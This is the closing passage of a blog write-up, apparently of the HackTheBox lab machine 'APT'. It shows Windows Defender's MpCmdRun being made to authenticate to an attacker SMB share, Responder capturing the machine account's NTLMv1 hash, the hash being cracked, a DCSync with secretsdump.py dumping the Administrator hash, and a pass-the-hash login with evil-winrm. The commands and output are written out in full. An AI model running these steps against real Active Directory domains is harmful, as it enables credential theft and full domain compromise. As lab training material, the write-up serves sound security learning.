<div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Program</span> <span class=n>Files</span><span class=p>\</span><span class=n>Windows</span> <span class=n>Defender</span><span class=p>&gt;.\</span><span class=n>MpCmdRun</span><span class=p>.</span><span class=n>exe</span> <span class=n>-Scan</span> <span class=n>-ScanType</span> <span class=n>3</span> <span class=o>-File</span> <span class=p>\\</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>14</span><span class=p>.</span><span class=n>72</span><span class=p>\</span><span class=n>notexist</span>

<span class=n>Scan</span> <span class=n>starting</span><span class=p>...</span>
<span class=n>CmdTool</span><span class=err>:</span> <span class=n>Failed</span> <span class=n>with</span> <span class=n>hr</span> <span class=p>=</span> <span class=n>0x80508023</span><span class=p>.</span> <span class=n>Check</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>HENRY</span><span class=p>~</span><span class=n>2</span><span class=p>.</span><span class=n>VIN</span><span class=p>\</span><span class=n>AppData</span><span class=p>\</span><span class=n>Local</span><span class=p>\</span><span class=n>Temp</span><span class=p>\</span><span class=n>MpCmdRun</span><span class=p>.</span><span class=n>log</span> <span class=k>for</span> <span class=n>more</span> <span class=n>information</span>
</code></pre></div><blockquote>
<p>Active Directory uses Kerberos as the default authentication method, but it will fallback to NTLM authentication if the client try to connect to other hosts with IP address</p>
</blockquote>
<p>But on my Kali, <code>responder</code> has successfully captured the hash of <code>APT$</code>, the computer account of the box.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>...&lt;snip&gt;..
<span class=o>[</span>+<span class=o>]</span> Listening <span class=k>for</span> events...
<span class=o>[</span>SMB<span class=o>]</span> NTLMv1 Client   : 10.10.10.213
<span class=o>[</span>SMB<span class=o>]</span> NTLMv1 Username : HTB<span class=se>\A</span>PT$
<span class=o>[</span>SMB<span class=o>]</span> NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
</code></pre></div><p>When there is no credentials are specified explicitly, Windows uses the current credentials.</p>
<p>However, because Windows Defender is already running as SYSTEM (built-in local system), (afaik) it can not be downgraded to a lower privilege for authentication. It won’t authenticate using SYSTEM as well. Instead, it uses the machine/computer account for authentication. LocalSystem and NetworkService credentials use computer account for authentication.</p>
<h4 id=cracking-ntlmv1-hash>Cracking NTLMv1 hash<a class=anchor aria-hidden=true href=#cracking-ntlmv1-hash>#</a></h4>
<p>I can submit the hash to <a href=https://crack.sh/>https://crack.sh/</a> with the following format.</p>
<pre><code>NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
</code></pre><p><img class=img-container src=imgs/image-20210417161415390.png alt=image-20210417161415390>
</p>
<p>It will automatically detect the input.</p>
<p><img class=img-container src=imgs/image-20210417161541589.png alt=image-20210417161541589>
</p>
<p>Not even a minute passed, it sent me the result.</p>
<p><img class=img-container src=imgs/image-20210417161758516.png alt=image-20210417161758516>
</p>
<p>The key is <code>d167c3238864b12f5f82feae86a7f798</code>, it&rsquo;s the NTLM hash/NThash that can be used for <em>pass-the-hash</em> attack.</p>
<h4 id=credential-dumping>Credential Dumping<a class=anchor aria-hidden=true href=#credential-dumping>#</a></h4>
<p>NTLM Hash of a computer account can not be used for remote login. Instead, it can be used to perform DCSync attack using <code>secretsdump.py</code>. I&rsquo;ll take only the administrator hash.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «~» «10.10.14.72» 
$ secretsdump.py <span class=s1>&#39;htb.local/APT$@apt&#39;</span> -hashes <span class=s1>&#39;d167c3238864b12f5f82feae86a7f798:d167c3238864b12f5f82feae86a7f798&#39;</span> -just-dc-user administrator

Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span class=m>2020</span> SecureAuth Corporation

<span class=o>[</span>*<span class=o>]</span> Dumping Domain Credentials <span class=o>(</span>domain<span class=se>\u</span>id:rid:lmhash:nthash<span class=o>)</span>
<span class=o>[</span>*<span class=o>]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
...&lt;snip&gt;..
<span class=o>[</span>*<span class=o>]</span> Cleaning up...
</code></pre></div><p>I can login into the box using <code>evil-winrm</code> with the administrator hash I obtained.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «~» «10.10.14.72» 
$ evil-winrm -i apt -u administrator -H c370bddf384a691d811ff3495e8a72e2

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>ocuments&gt; <span class=nb>type</span> ..<span class=se>\D</span>esktop<span class=se>\r</span>oot.txt
a1f204c405aea36388...<span class=o>[</span>SNIP<span class=o>]</span>...
*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>ocuments&gt; 
</code></pre></div><hr>
<h2 id=references>References<a class=anchor aria-hidden=true href=#references>#</a></h2>
<ul>
<li>
<p><a href=https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc>https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc</a></p>
</li>
<li>
<p><a href=https://pubs.opengroup.org/onlinepubs/098759899/CHP21CHP.HTM>https://pubs.opengroup.org/onlinepubs/098759899/CHP21CHP.HTM</a></p>
</li>
<li>
<p><a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wpo/f8bb99d3-7755-4ab9-9510-09920196f8b0>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wpo/f8bb99d3-7755-4ab9-9510-09920196f8b0</a></p>
</li>
<li>
<p><a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4</a></p>
</li>
<li>
<p><a href=https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/>https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/</a></p>
</li>
<li>
<p><a href=https://en.wikipedia.org/wiki/NT_LAN_Manager>https://en.wikipedia.org/wiki/NT_LAN_Manager</a></p>
</li>
<li>
<p><a href=https://www.blackhat.com/presentations/win-usa-04/bh-win-04-seki-up2.pdf>https://www.blackhat.com/presentations/win-usa-04/bh-win-04-seki-up2.pdf</a></p>
</li>
<li>
<p><a href=https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4>https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</a></p>
</li>
<li>
<p><a href=https://www.trustedsec.com/blog/the-tale-of-the-lost-but-not-forgotten-undocumented-netsync-part-1/>https://www.trustedsec.com/blog/the-tale-of-the-lost-but-not-forgotten-undocumented-netsync-part-1/</a></p>
</li>
<li>
<p><a href=https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/machine-account-password-process/ba-p/396026>https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/machine-account-password-process/ba-p/396026</a></p>
</li>
</ul>
</div>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://fahmifj.github.io/tags/oscp-plus/>OSCP-plus</a></li>
<li><a href=https://fahmifj.github.io/tags/windows/>Windows</a></li>
<li><a href=https://fahmifj.github.io/tags/active-directory/>Active-Directory</a></li>
<li><a href=https://fahmifj.github.io/tags/domain-controller/>Domain-Controller</a></li>
<li><a href=https://fahmifj.github.io/tags/ms-rpc/>MS-RPC</a></li>
<li><a href=https://fahmifj.github.io/tags/ioxidresolver/>IOXIDResolver</a></li>
<li><a href=https://fahmifj.github.io/tags/zip2john/>zip2john</a></li>
<li><a href=https://fahmifj.github.io/tags/windows-registry/>Windows-registry</a></li>
<li><a href=https://fahmifj.github.io/tags/ntlmv1/>NTLMv1</a></li>
<li><a href=https://fahmifj.github.io/tags/mpcmdrun/>MpCmdRun</a></li>
<li><a href=https://fahmifj.github.io/tags/responder/>Responder</a></li>
<li><a href=https://fahmifj.github.io/tags/dcsync/>DCSync</a></li>
<li><a href=https://fahmifj.github.io/tags/reg.py/>reg.py</a></li>
<li><a href=https://fahmifj.github.io/tags/secretsdump.py/>secretsdump.py</a></li>
<li><a href=https://fahmifj.github.io/tags/socat/>socat</a></li>
</ul>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - APT on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20APT&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-apt%2f&hashtags=OSCP-plus%2cWindows%2cActive-Directory%2cDomain-controller%2cMS-RPC%2cIOXIDResolver%2czip2john%2cWindows-registry%2cNTLMv1%2cMpCmdRun%2cResponder%2cDCSync%2creg.py%2csecretsdump.py%2csocat"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - APT on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-apt%2f&title=HackTheBox%20-%20APT&summary=HackTheBox%20-%20APT&source=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-apt%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - APT on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-apt%2f&title=HackTheBox%20-%20APT"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - APT on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-apt%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - APT on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20APT%20-%20https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-apt%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - APT on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20APT&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-apt%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2021 <a href=https://fahmifj.github.io/>友人F</a></span>
<span>&#183;</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)">
<button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</button>
</a>
<script>var toc=document.getElementsByClassName('inner')[0],pTag=document.getElementsByClassName('post-meta')[0],fromTop=pTag.getBoundingClientRect().top,fromBottom=pTag.getBoundingClientRect().bottom;document.addEventListener('scroll',function(b){let a=document.documentElement.scrollTop+75;a>fromTop?(toc.style.visibility='visible',toc.style.opacity='1'):(toc.style.visibility='hidden',toc.style.opacity='0')})</script>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
</body>
</html>